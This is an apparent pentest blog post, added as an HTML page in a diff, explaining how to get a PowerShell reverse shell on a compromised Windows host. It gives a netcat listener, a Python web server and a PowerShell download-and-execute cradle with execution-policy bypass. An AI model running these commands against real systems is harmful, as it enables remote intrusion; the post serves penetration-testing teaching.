@@ -1,0 +1,123 @@
+
+<html>
+<head>
+  <title>BrainDeadMonkeys</title>
+  <meta charset="UTF-8">
+  <style>
+    
+    body {
+      color: #DDDDDD;
+      /* color: #c5c8c6; */
+      /*background-color: #0d0d18;*/
+      background-color: black;
+    }
+    pre {
+    }
+    a {
+      color: #54d7f9;
+      text-decoration: none;
+    }
+    ik {
+      color: #74ee15;
+    }
+    y {
+      color: #f0c674;
+    }
+    gr {
+      color: #b5bd68;
+    }
+    r {
+      color: #9e0034;
+    }
+    w {
+      color: #ffffff;
+    }
+    pink {
+      color: #f4b6e5;
+    }
+    bb {
+      color: #5cc2ca; /* baby blue */
+    }
+    purp {
+      color: #7a80a2;
+    }
+    l {
+      color: #c5c8c6;
+    }
+    lg {
+      color: #9de9a9;
+    }
+    sea {
+      color: #93ff4c;
+    }
+  </style>
+</head>
+<pre>
+<body><center><div style="display: inline-block; text-align:left;">
+----------------------------------------------------------------------------------------------------
+
+                  $$\                               $$\            $$$$$$\    $$\        $$\ 
+                  $$ |                              $$ |          $$$ __$$\ $$$$ |       $$ |
+        $$$$$$\ $$$$$$\    $$$$$$\  $$$$$$$\   $$$$$$$ | $$$$$$\  $$$$\ $$ |\_$$ |  $$$$$$$ |
+       $$  __$$\\_$$  _|   \____$$\ $$  __$$\ $$  __$$ |$$  __$$\ $$\$$\$$ |  $$ | $$  __$$ |
+       $$ |  \__| $$ |     $$$$$$$ |$$ |  $$ |$$ /  $$ |$$ |  \__|$$ \$$$$ |  $$ | $$ /  $$ |
+       $$ |       $$ |$$\ $$  __$$ |$$ |  $$ |$$ |  $$ |$$ |      $$ |\$$$ |  $$ | $$ |  $$ |
+       $$ |       \$$$$  |\$$$$$$$ |$$ |  $$ |\$$$$$$$ |$$ |      \$$$$$$  /$$$$$$\\$$$$$$$ |
+       \__|        \____/  \_______|\__|  \__| \_______|\__|       \______/ \______|\_______|
+
+----------------------------------------------------------------------------------------------------
+
+by: andr01d
+
+<p>
+When you ware working in a Windows environment, whether Active Directory is involved or not, 
+there will come a time when you need a reverse shell, and most reverse shells from Pentest Monkey 
+arent going to work in your situation. Gaining RCE on a Windows box typically means you have access 
+to either cmd or Powershell. Getting a reliable shell can give some trouble, but luckily, Powershell 
+has the ability to call and run Powershell scripts remotely without dropping anything on disk. 
+First, we need a powershell reverse-tcp script. Luckily, samratashok on github has Invoke-PowerShellTCP.ps1 
+For this to work well, we need to add a line to the end of the powershell script. For example:
+
+
+Invoke-PowerShellTcp -Reverse -IPAddress X.X.X.X -Port 4444
+
+
+where &lsquo;X.X.X.X&rsquo; is the IP address for the reverse shell to connect to. In order for our 
+target machine to be able to grab our Powershell script, we need to start up a webserver. I am partial 
+to using the easy python webserver, so we start it up using:
+
+
+python -m SimpleHTTPServer 80
+
+
+We will need a listener on our local machine for the reverse shell to connect back to, so lets start up 
+a netcat listener:
+
+
+netcat -lnvp 4444
+
+
+Next, we need to call this powershell script from our RCE on the Windows box. To call this script remotely, 
+we need to run this on the Windows machine:
+
+
+powershell.exe -exec bypass iex(New-Object Net.WebClient).DownloadString(&lsquo;http://X.X.X.X/InvokePowerShellTcp.ps1')
+
+
+If we are lucky, this will now throw a reverse Powershell instance back to our netcat listener
+
+
+root@kali:~# nc -lnvp 4444
+listening on [any] 4444
+connecting to [X.X.X.X] from (UNKNOWN) [X.X.X.X] 47907
+Windows PowerShell running as user MS01$ on MS01 Copyright &copy; 2015 Microsoft Corporation. All right reserved.
+</p>
+
+</div>
+
+<a href="../index.html">Home</a>
+</body>
+</center>
+</div>
+</html>
+
